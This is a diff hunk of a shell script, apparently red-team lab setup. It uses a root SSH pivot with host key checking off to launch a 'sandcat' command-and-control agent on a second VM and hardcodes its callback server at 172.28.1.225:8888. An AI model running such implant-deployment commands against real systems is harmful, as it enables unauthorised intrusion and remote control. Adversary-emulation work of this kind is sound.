@@ -27,7 +27,7 @@ echo "Agent copied to second VM."
 
 # Start the agent on the second VM (192.168.202.100) via the first VM
 ssh -i /root/perry_key.pem -o StrictHostKeyChecking=no root@192.168.1.234 \
-  "ssh -i /root/perry_key.pem -o StrictHostKeyChecking=no root@192.168.202.100 'nohup /tmp/sandcat.go -server http://$SERVER_IP -group red > /tmp/agent.log 2>&1 &'"
+  "ssh -i /root/perry_key.pem -o StrictHostKeyChecking=no root@192.168.202.100 'nohup /tmp/sandcat.go -server http://172.28.1.225:8888 -group red > /tmp/agent.log 2>&1 &'"
 echo "Agent started on second VM."
 
 
